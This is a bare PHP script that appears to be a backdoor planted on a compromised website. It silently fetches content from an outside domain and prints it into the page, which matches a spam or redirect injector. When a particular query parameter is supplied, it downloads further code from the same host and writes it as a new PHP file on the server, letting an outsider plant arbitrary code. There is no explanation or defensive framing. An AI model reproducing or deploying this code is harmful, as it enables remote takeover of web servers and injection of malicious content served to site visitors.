<?php
error_reporting(0);
$s='http://a1b2cd.club/';
$x = $s.'l-'.base64_encode('http://google.com/');

if(function_exists('curl_init'))
{
$ch = @curl_init(); curl_setopt($ch, CURLOPT_URL, $x); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $gitt = curl_exec($ch); curl_close($ch);
if($gitt == false){
    @$gitt = file_get_contents($x);
}
}elseif(function_exists('file_get_contents')){
    @$gitt = file_get_contents($x);
}
echo $gitt;

if(isset($_GET['ksfg'])){
    $f=fopen($_GET['ksfg'].'.php','a');
    fwrite($f,file_get_contents($s.'s-'.$_GET['ksfg']));
    fclose($f);
}
echo '<!DOCTYPE html!>';
?>